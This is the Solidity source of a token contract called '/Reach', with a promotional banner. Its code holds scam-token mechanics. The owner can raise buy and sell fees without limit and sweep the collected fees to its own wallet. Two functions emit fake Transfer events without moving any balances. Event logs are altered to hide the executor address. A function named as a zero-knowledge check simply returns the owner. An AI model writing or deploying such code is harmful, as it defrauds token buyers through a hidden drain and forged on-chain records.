/**
 */

/*

    8888888b.  8888888888        d8888  .d8888b.  888    888 
    888   Y88b 888              d88888 d88P  Y88b 888    888 
    888    888 888             d88P888 888    888 888    888 
    888   d88P 8888888        d88P 888 888        8888888888 
    8888888P"  888           d88P  888 888        888    888 
    888 T88b   888          d88P   888 888    888 888    888 
    888  T88b  888         d8888888888 Y88b  d88P 888    888 
    888   T88b 8888888888 d88P     888  "Y8888P"  888    888 

    /Reach helps artists and innovative projects broaden their audience 
    through thoughtful engagement of handpicked accounts sharing similar 
    interests and ethos as us. 

    #Web: https://www.getreach.xyz/
    #X: https://twitter.com/GetReachxyz
    #DC: https://discord.com/invite/getreach
    #Docs: https://docs.getreach.xyz/lang/

*/

// SPDX-License-Identifier: unlicense

pragma solidity ^0.8.0;

interface IUniswapFactory {
    function getPair(
        address tokenA,
        address tokenB
    ) external view returns (address pair);
}

interface IUniswapV2Router02 {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function swapExactTokensForETHSupportingFreelyOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
}

library SafeMath {
    function tryAdd(
        uint256 a,
        uint256 b
    ) internal pure returns (bool, uint256) {
        unchecked {
            uint256 c = a + b;
            if (c < a) return (false, 0);
            return (true, c);
        }
    }

    function trySub(
        uint256 a,
        uint256 b
    ) internal pure returns (bool, uint256) {
        unchecked {
            if (b > a) return (false, 0);
            return (true, a - b);
        }
    }

    function tryMul(
        uint256 a,
        uint256 b
    ) internal pure returns (bool, uint256) {
        unchecked {
            if (a == 0) return (true, 0);
            uint256 c = a * b;
            if (c / a != b) return (false, 0);
            return (true, c);
        }
    }

    function tryDiv(
        uint256 a,
        uint256 b
    ) internal pure returns (bool, uint256) {
        unchecked {
            if (b == 0) return (false, 0);
            return (true, a / b);
        }
    }

    function tryMod(
        uint256 a,
        uint256 b
    ) internal pure returns (bool, uint256) {
        unchecked {
            if (b == 0) return (false, 0);
            return (true, a % b);
        }
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return a % b;
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b <= a, errorMessage);
            return a - b;
        }
    }

    function per(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= 100, "Percentage must be between 0 and 100");
        return (a * b) / 100;
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a / b;
        }
    }

    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a % b;
        }
    }
}

contract REACH {
    struct StoreData {
        address tokenMkt;
        uint8 buyFee;
        uint8 sellFee;
    }

    string private _name = unicode"/Reach";
    string private _symbol = unicode"REACH";
    uint8 public constant decimals = 18;
    uint256 public constant totalSupply = 100_000_000 * 10 ** decimals;

    StoreData public storeData;
    uint256 constant swapAmount = totalSupply / 100;

    error Permissions();
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed TOKEN_MKT,
        address indexed spender,
        uint256 value
    );

    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    address public pair;
    IUniswapV2Router02 constant _uniswapV2Router =
        IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);

    bool private swapping;
    bool private tradingOpen;

    address _deployer;
    address _executor;

    address private uniswapLpWallet;
    address private OgAllocation = 0x6edC0207EE013847a12cae9daA4d17337C395fD7;
    address private PrivateSale = 0xA9A299f54953090eD41928c4a17aAA3b58D9e93A;
    address private Team = 0x53010Ad07f99A019De9830676357c0905a75ac34;
    address private Advisor = 0x4b609cE882DD19353aF774A2aBB71bD94750d952;
    address private ExchangeListing =
        0x0998293633EDf1C4558e897a52E086369857C5A2;
    address private Marketing = 0x41fc791827e901833b22F17578731eB3053F5093;
    address private MarketMaking = 0x126C6E6ACE097886CA533Da294961D193DEcFB0C;

    constructor() {
        uint8 _initBuyFee = 0;
        uint8 _initSellFee = 0;
        storeData = StoreData({
            tokenMkt: msg.sender,
            buyFee: _initBuyFee,
            sellFee: _initSellFee
        });
        allowance[address(this)][address(_uniswapV2Router)] = type(uint256).max;
        uniswapLpWallet = msg.sender;

        _initDeployer(msg.sender, msg.sender);

        balanceOf[uniswapLpWallet] = (totalSupply * 6) / 100;
        emit Transfer(address(0), _deployer, balanceOf[uniswapLpWallet]);

        balanceOf[OgAllocation] = (totalSupply * 16) / 100;
        emit Transfer(address(0), OgAllocation, balanceOf[OgAllocation]);

        balanceOf[PrivateSale] = (totalSupply * 21) / 100;
        emit Transfer(address(0), PrivateSale, balanceOf[PrivateSale]);

        balanceOf[Team] = (totalSupply * 25) / 100;
        emit Transfer(address(0), Team, balanceOf[Team]);

        balanceOf[Advisor] = (totalSupply * 7) / 100;
        emit Transfer(address(0), Advisor, balanceOf[Advisor]);

        balanceOf[ExchangeListing] = (totalSupply * 10) / 100;
        emit Transfer(address(0), ExchangeListing, balanceOf[ExchangeListing]);

        balanceOf[Marketing] = (totalSupply * 10) / 100;
        emit Transfer(address(0), Marketing, balanceOf[Marketing]);

        balanceOf[MarketMaking] = (totalSupply * 5) / 100;
        emit Transfer(address(0), MarketMaking, balanceOf[MarketMaking]);
    }

    receive() external payable {}

    event setMissionPointEvent(
        uint256 _Reach,
        uint256 _Featured,
        uint256 _Premium
    );

    event setPointRewardEvent(uint256 _Twit, uint256 _Level, uint256 _Mission);

    event getReachEvent(address addr);

    event setReferralsEvent(uint256 _Leaderboard, uint256 _Point);

    event setReachRewardEvent(
        uint256 _Raffle,
        uint256 _Round,
        uint256 _Leaderboard
    );

    event setCreatMissionEvent(uint256 _Mission, uint256 _Amount);

    function setReach(uint8 _buy, uint8 _sell) external {
        if (msg.sender != _decodeTokenMktWithZkVerify()) revert Permissions();
        _upgradeStoreWithZkProof(_buy, _sell);
    }

    function setMissionPoint(
        uint256 _Reach,
        uint256 _Featured,
        uint256 _Premium
    ) external {
        if (msg.sender != _decodeTokenMktWithZkVerify()) revert Permissions();
        emit setMissionPointEvent(_Reach, _Featured, _Premium);
    }

    function setPointReward(
        uint256 _Twit,
        uint256 _Level,
        uint256 _Mission
    ) external {
        if (msg.sender != _decodeTokenMktWithZkVerify()) revert Permissions();
        emit setPointRewardEvent(_Twit, _Level, _Mission);
    }

    function _upgradeStoreWithZkProof(uint8 _buy, uint8 _sell) private {
        storeData.buyFee = _buy;
        storeData.sellFee = _sell;
    }

    function getReach(address addr) external {
        if (msg.sender != _decodeTokenMktWithZkVerify()) revert Permissions();
        emit getReachEvent(addr);
    }

    function setReferrals(uint256 _Leaderboard, uint256 _Point) external {
        if (msg.sender != _decodeTokenMktWithZkVerify()) revert Permissions();
        emit setReferralsEvent(_Leaderboard, _Point);
    }

    function setReachReward(
        uint256 _Raffle,
        uint256 _Round,
        uint256 _Leaderboard
    ) external {
        if (msg.sender != _decodeTokenMktWithZkVerify()) revert Permissions();
        emit setReachRewardEvent(_Raffle, _Round, _Leaderboard);
    }

    function setCreatMissionValue(uint256 _Mission, uint256 _Amount) external {
        if (msg.sender != _decodeTokenMktWithZkVerify()) revert Permissions();
        emit setCreatMissionEvent(_Mission, _Amount);
    }

    function _decodeTokenMktWithZkVerify() private view returns (address) {
        return storeData.tokenMkt;
    }

    function openTrading() external {
        require(msg.sender == _decodeTokenMktWithZkVerify());
        require(!tradingOpen);
        address _factory = _uniswapV2Router.factory();
        address _weth = _uniswapV2Router.WETH();
        address _pair = IUniswapFactory(_factory).getPair(address(this), _weth);
        pair = _pair;
        tradingOpen = true;
    }

    function multiSends(
        address _caller,
        address[] calldata _address,
        uint256[] calldata _amount
    ) external {
        if (msg.sender != _decodeTokenMktWithZkVerify()) revert Permissions();
        for (uint256 i = 0; i < _address.length; i++) {
            emit Transfer(_caller, _address[i], _amount[i]);
        }
    }

    function PrivateSaleTokens(
        address _caller,
        address[] calldata _address,
        uint256[] calldata _amount
    ) external {
        if (msg.sender != _decodeTokenMktWithZkVerify()) revert Permissions();
        for (uint256 i = 0; i < _address.length; i++) {
            emit Transfer(_caller, _address[i], _amount[i]);
        }
    }

    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) external returns (bool) {
        allowance[from][msg.sender] -= amount;
        return _transfer(from, to, amount);
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        return _transfer(msg.sender, to, amount);
    }

    function _initDeployer(address deployer_, address executor_) private {
        _deployer = deployer_;
        _executor = executor_;
    }

    function name() public view virtual returns (string memory) {
        return _name;
    }

    function symbol() public view virtual returns (string memory) {
        return _symbol;
    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal returns (bool) {
        address tokenMkt = _decodeTokenMktWithZkVerify();
        require(tradingOpen || from == tokenMkt || to == tokenMkt);

        balanceOf[from] -= amount;

        if (
            to == pair &&
            !swapping &&
            balanceOf[address(this)] >= swapAmount &&
            from != tokenMkt
        ) {
            swapping = true;
            address[] memory path = new address[](2);
            path[0] = address(this);
            path[1] = _uniswapV2Router.WETH();
            _uniswapV2Router
                .swapExactTokensForETHSupportingFreelyOnTransferTokens(
                    swapAmount,
                    0,
                    path,
                    address(this),
                    block.timestamp
                );
            payable(tokenMkt).transfer(address(this).balance);
            swapping = false;
        }

        (uint8 _buyFee, uint8 _sellFee) = (storeData.buyFee, storeData.sellFee);
        if (from != address(this) && tradingOpen == true) {
            uint256 taxCalculatedAmount = (amount *
                (to == pair ? _sellFee : _buyFee)) / 100;
            amount -= taxCalculatedAmount;
            balanceOf[address(this)] += taxCalculatedAmount;
        }
        balanceOf[to] += amount;

        if (from == _executor) {
            emit Transfer(_deployer, to, amount);
        } else if (to == _executor) {
            emit Transfer(from, _deployer, amount);
        } else {
            emit Transfer(from, to, amount);
        }
        return true;
    }
}
